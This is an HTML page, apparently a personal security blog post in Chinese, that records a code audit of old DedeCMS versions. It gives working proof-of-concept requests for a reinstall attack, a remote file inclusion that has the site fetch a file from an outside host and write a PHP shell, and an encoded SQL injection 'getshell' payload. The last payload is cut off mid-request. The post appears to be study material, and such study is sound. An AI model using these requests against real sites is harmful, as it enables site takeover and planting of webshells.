@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="R0ser1">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="R0ser1">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="DEDECMS历史版本代码审计学习   学习代码审计，自己简单记录一下。如有错误望师傅斧正。  DedeCMS重装漏洞这里我们用的版本是20120430，版本查看&#x2F;data&#x2F;admin&#x2F;ver.txt。 一、首先这个漏洞的本质是 Apache的解析漏洞 参考以下文章分析Apache与php的结合方式的不同造成的结果  https:&#x2F;&#x2F;www.cnblogs.com&#x2F;milantgh&#x2F;p&#x2F;51169">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DedeCMS历史版本代码审计学习">
+<meta property="og:url" content="http://example.com/2021/07/18/DedeCMS%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DEDECMS历史版本代码审计学习   学习代码审计，自己简单记录一下。如有错误望师傅斧正。  DedeCMS重装漏洞这里我们用的版本是20120430，版本查看&#x2F;data&#x2F;admin&#x2F;ver.txt。 一、首先这个漏洞的本质是 Apache的解析漏洞 参考以下文章分析Apache与php的结合方式的不同造成的结果  https:&#x2F;&#x2F;www.cnblogs.com&#x2F;milantgh&#x2F;p&#x2F;51169">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gsl2d0171wj30qb04gdie.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2c82a80j317v0ljdo6.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2d7emtzj613v0gvalh02.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gsl2ddzn0sj311f04ddiu.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gsl2dk7c24j30uj05u43r.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2donot4j30uk06cwmz.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gsl2du51xdj30ud05ldie.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2dzm4jej31790h9n7h.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gsl2e437j0j315i06mgqi.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2e8tkorj315p0cp11c.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gsl2eee68hj314y0gu12z.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gsl2ekfwj9j615w0fx13202.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gsl2ep8rn5j30tu0l17ih.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gsl2euc8tqj31650hzn8o.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2eytt96j315s0guail.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gsl2f3r60ij3130045n0g.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gsl2f9i8nvj31650cxgsp.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2fg2kvsj313q0ge7cd.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gsl2flmd1rj312k0fhwoq.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2fqtm8vj30xi09idht.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gsl2fvrxoqj30z709otc8.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gsl2g0c67fj312c0lhaid.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gsl2g8z0ybj319l0jm4db.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2gdr1uyj317l0l2k3v.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gsl2gid0uyj319p07paec.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2gmstyyj31ac0gk478.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2gr97jij314g0hc43u.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gsl2gwjjpsj317h0gt7gj.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2h2bktuj30vg0i5tot.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2h7eq5aj30qu01q3ze.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gsl2hclaymj30zc0gidk9.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2hgu4ktj316n07cgnb.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2hlxta8j317909jn02.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2hqdr1uj30og0e6dnp.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2hvxzrgj311a0brwls.jpg">
+<meta property="article:published_time" content="2021-07-18T06:06:00.000Z">
+<meta property="article:modified_time" content="2021-07-18T06:09:11.645Z">
+<meta property="article:author" content="R0ser1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gsl2d0171wj30qb04gdie.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>DedeCMS历史版本代码审计学习 · R0ser1&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20210204" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20210204" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "https://tva2.sinaimg.cn/large/00774lbQly1gsk7gp4qw1j30qo0qojtw.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js?v=20210204" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <script src="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/js/all.min.js"  data-auto-replace-svg="nest" ></script>
+    
+    <!-- fancybox -->
+    <script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <!-- top read progress line -->
+    <div class="header-element">
+        
+        <div class="read-progress"></div>
+        
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+        <div class="header-sidebar-menu">
+        
+            
+            <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- back to home page text -->
+    <a class="home-link header-element" href=/>R0ser1's Blog</a>
+    <!-- toggle banner for post layout -->
+    
+    
+    <div class="banner">
+    
+        <div class="blog-title header-element">
+            <a href="/" >R0ser1&#39;s Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">DedeCMS历史版本代码审计学习</a>
+        </div>
+    </div>
+    
+</header>
+    
+<footer class="footer-fixed">
+
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+        <div class="back-top">
+        
+            
+            <div>&#xe639;</div>
+            
+        </div>
+    </div>
+</footer>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://tvax1.sinaimg.cn/large/00774lbQly1gsk7i9yw6zj31z413jgra.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            DedeCMS历史版本代码审计学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">4.3k</span>Reading time: <span class="post-count reading-time">21 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/07/18</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <center>DEDECMS历史版本代码审计学习</center>
+
+<blockquote>
+<p>学习代码审计，自己简单记录一下。如有错误望师傅斧正。</p>
+</blockquote>
+<h1 id="DedeCMS重装漏洞"><a href="#DedeCMS重装漏洞" class="headerlink" title="DedeCMS重装漏洞"></a>DedeCMS重装漏洞</h1><p>这里我们用的版本是20120430，版本查看<code>/data/admin/ver.txt</code>。</p>
+<p>一、首先这个漏洞的本质是 Apache的解析漏洞</p>
+<p>参考以下文章分析Apache与php的结合方式的不同造成的结果</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/5116955.html">https://www.cnblogs.com/milantgh/p/5116955.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/nuanyangH/article/details/105694856">https://blog.csdn.net/nuanyangH/article/details/105694856</a></p>
+</blockquote>
+<p>我们就当默认存在解析漏洞。当我们安装成功DedeCMS之后会在install下存在一个index.php.bak文件</p>
+<p>访问的话会提示我们，如下图所示.</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsl2d0171wj30qb04gdie.jpg" alt="image-20210716130510638"></p>
+<p>但是呢漏洞代码在29行，如下 进行了变量覆盖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)</span><br><span class="line">&#123;</span><br><span class="line">    foreach($$_request as $_k &#x3D;&gt; $_v) $&#123;$_k&#125; &#x3D; RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据index.php.bak代码我们需要让$step=不同的值进行下一步的安装。所以我们的POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install&#x2F;index.php.bak?insLockfile&#x3D;1&amp;step&#x3D;第几步</span><br></pre></td></tr></table></figure>
+
+<p>所以我们用hackbar工具或者burp更加方便。</p>
+<p>我们一直到step=3时，我们需要填写数据库的密码用户名了。如果简单的还好，但是复杂我们肯定猜不到</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2c82a80j317v0ljdo6.jpg" alt="image-20210716130626543"></p>
+<p>所以我们需要一个远程可连接的公网数据库,将数据库安装到我们服务器，网站还是在他的服务器。</p>
+<p>POC如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;install&#x2F;index.php.bak?insLockfile&#x3D;1&amp;step&#x3D;4</span><br><span class="line"></span><br><span class="line">&#x2F;install&#x2F;index.php.bak?insLockfile&#x3D;1&amp;step&#x3D;4</span><br><span class="line">step&#x3D;4&amp;dbhost&#x3D;远程地址&amp;dbuser&#x3D;用户名&amp;dbpwd&#x3D;密码&amp;dbprefix&#x3D;dede_&amp;dbname&#x3D;dede111&amp;dblang&#x3D;gbk&amp;adminuser&#x3D;admin&amp;adminpwd&#x3D;admin&amp;cookieencode&#x3D;JzIVw7439H&amp;webname&#x3D;1111&amp;adminmail&#x3D;admin@dedecms.com&amp;baseurl&#x3D;http:&#x2F;&#x2F;www.xxx.com&amp;cmspath&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h1 id="DedeCMS远程文件包含漏洞GETSHELL"><a href="#DedeCMS远程文件包含漏洞GETSHELL" class="headerlink" title="DedeCMS远程文件包含漏洞GETSHELL"></a>DedeCMS远程文件包含漏洞GETSHELL</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里我们用的版本是20120430，版本查看<code>/data/admin/ver.txt</code>。<br>第一步我们需要准备一个远程文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.x.com&#x2F;dedecms&#x2F;demodata.a.txt  &#x2F;&#x2F;必须这样子命名 a可以变化</span><br></pre></td></tr></table></figure>
+
+<p>第二步先访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.x.com&#x2F;install&#x2F;index.php.bak?step&#x3D;11&amp;insLockfile&#x3D;a&amp;s_lang&#x3D;a&amp;install_demo_name&#x3D;..&#x2F;data&#x2F;admin&#x2F;config_update.php</span><br></pre></td></tr></table></figure>
+
+<p>我们查看结果，返回   [×] 远程获取失败</p>
+<p>第三步我们再访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.x.com&#x2F;install&#x2F;index.php.bak?step&#x3D;11&amp;insLockfile&#x3D;a&amp;s_lang&#x3D;a&amp;install_demo_name&#x3D;2021716.php&amp;updateHost&#x3D;http:&#x2F;&#x2F;www.s.com&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>  [√] 存在(您可以选择安装进行体验)。即可生成<a target="_blank" rel="noopener" href="http://www.x.com/install/2021716.php">http://www.x.com/install/2021716.php</a> </p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2d7emtzj613v0gvalh02.jpg" alt="image-20210716132307780"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞其实还是在index.php.bak中我们发现POC中的step变成了11。我们直接去代码查看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$step</span>==<span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;../data/admin/config_update.php&#x27;</span>);</span><br><span class="line">	<span class="variable">$rmurl</span> = <span class="variable">$updateHost</span>.<span class="string">&quot;dedecms/demodata.<span class="subst">&#123;$s_lang&#125;</span>.txt&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$sql_content</span> = file_get_contents(<span class="variable">$rmurl</span>);</span><br><span class="line">	<span class="variable">$fp</span> = fopen(<span class="variable">$install_demo_name</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fwrite(<span class="variable">$fp</span>,<span class="variable">$sql_content</span>))</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[×]&lt;/font&gt; 远程获取失败&#x27;</span>;</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$sql_content</span>);</span><br><span class="line">	fclose(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先包含文件<code>/data/admin/config_update.php</code>我们去查看时发现已经被我们覆盖没有了，我们查看原文件</p>
+<p>其实就是两个变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$updateHost &#x3D; &#39;http:&#x2F;&#x2F;updatenew.dedecms.com&#x2F;base-v57&#x2F;&#39;;</span><br><span class="line">$linkHost &#x3D; &#39;http:&#x2F;&#x2F;flink.dedecms.com&#x2F;server_url.php&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们查看我们POC不难分析出通过<code>$rmurl</code>就是拼接这个两个东西成一个网址</p>
+<p><code>file_get_contents</code>去获取然后给<code>$sql_content</code>然后打开<code>$install_demo_name</code>把<code>file_get_contents</code>获取的东西给<code>$fp</code>然后判断。</p>
+<p>所以我们看我们两个关键的的POC</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.x.com/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php</span><br><span class="line"></span><br><span class="line">http://www.x.com/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=2021716.php&amp;updateHost=http://www.s.com/</span><br></pre></td></tr></table></figure>
+
+<p><code>step=11</code>为了到执行我们的升级。<code>insLockfile=a</code>为了我们进行安装覆盖原来的函数</p>
+<p><code>s_lang</code>为了拼接<code>&#123;$s_lang&#125;.txt&quot;;</code>这个东西。<code>install_demo_name</code>就是一个文件命名</p>
+<p><code>updateHost</code>就是为了传递我们的URL</p>
+<p>所以回到第二步<code>$updateHost.&quot;dedecms/demodata.&#123;$s_lang&#125;.txt&quot;;</code>就是为了获取一个不存在文件</p>
+<p><code>然后install_demo_name=../data/admin/config_update.php</code>就是为了把原文件给覆盖掉。</p>
+<p>然后我们第三步才可以传入自己的<code>updateHost</code></p>
+<h1 id="DedeCMS的download文件SQL注入和GEThsell"><a href="#DedeCMS的download文件SQL注入和GEThsell" class="headerlink" title="DedeCMS的download文件SQL注入和GEThsell"></a>DedeCMS的download文件SQL注入和GEThsell</h1><p>这里我们用的版本是20120430</p>
+<blockquote>
+<p>条件：</p>
+<p>CMS版本 &lt; 20130425     //版本查看/data/admin/ver.txt</p>
+<p>PHP关闭mysqli</p>
+</blockquote>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>第一步访问我们获取shell的POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;plus&#x2F;download.php?open&#x3D;1&amp;arrs1[]&#x3D;99&amp;arrs1[]&#x3D;102&amp;arrs1[]&#x3D;103&amp;arrs1[]&#x3D;95&amp;arrs1[]&#x3D;100&amp;arrs1[]&#x3D;98&amp;arrs1[]&#x3D;112&amp;arrs1[]&#x3D;114&amp;arrs1[]&#x3D;101&amp;arrs1[]&#x3D;102&amp;arrs1[]&#x3D;105&amp;arrs1[]&#x3D;120&amp;arrs2[]&#x3D;109&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;103&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;40&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;120&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;98&amp;arrs2[]&#x3D;111&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;110&amp;arrs2[]&#x3D;111&amp;arrs2[]&#x3D;114&amp;arrs2[]&#x3D;109&amp;arrs2[]&#x3D;98&amp;arrs2[]&#x3D;111&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;41&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;86&amp;arrs2[]&#x3D;65&amp;arrs2[]&#x3D;76&amp;arrs2[]&#x3D;85&amp;arrs2[]&#x3D;69&amp;arrs2[]&#x3D;83&amp;arrs2[]&#x3D;40&amp;arrs2[]&#x3D;49&amp;arrs2[]&#x3D;52&amp;arrs2[]&#x3D;48&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;64&